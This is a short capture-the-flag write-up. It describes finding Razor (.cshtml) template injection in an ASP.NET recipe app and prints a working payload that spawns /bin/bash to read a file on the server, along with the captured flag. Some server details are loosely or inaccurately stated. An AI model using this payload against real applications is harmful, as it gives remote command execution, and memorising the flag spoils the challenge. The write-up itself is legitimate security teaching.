The page lets you enter recipes and save them. Based on one of the prebuilt recipes, it's a good guess this is related to rendering engines.

Now you will notice that this is an ASP.NET application first glance:
1. the `id` parameter is not case sensitive when you try to load other recipes
2. Krestel server header (it's a Microsoft IIS thing)
3. You can trigger an error with aspx syntax, we now know it's .cshtml. And you can get code eval (see 2nd image)

We then build a cshtml payload to get RCE on the box. Also, it's running on Linux (3rd img) instead because of the file path and windows binaries aren't found.

```
@{ var psi = new System.Diagnostics.ProcessStartInfo(); psi.FileName = "/bin/bash"; psi.Arguments = "-c \"cat ../user.txt\""; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; psi.CreateNoWindow = true; var proc = System.Diagnostics.Process.Start(psi); string output = proc.StandardOutput.ReadToEnd(); proc.WaitForExit(); @output }
```

Flag: `brunner{m0R3_l1K3_r3c1P3_1NJ3ct1On!}`

Solved by: benkyou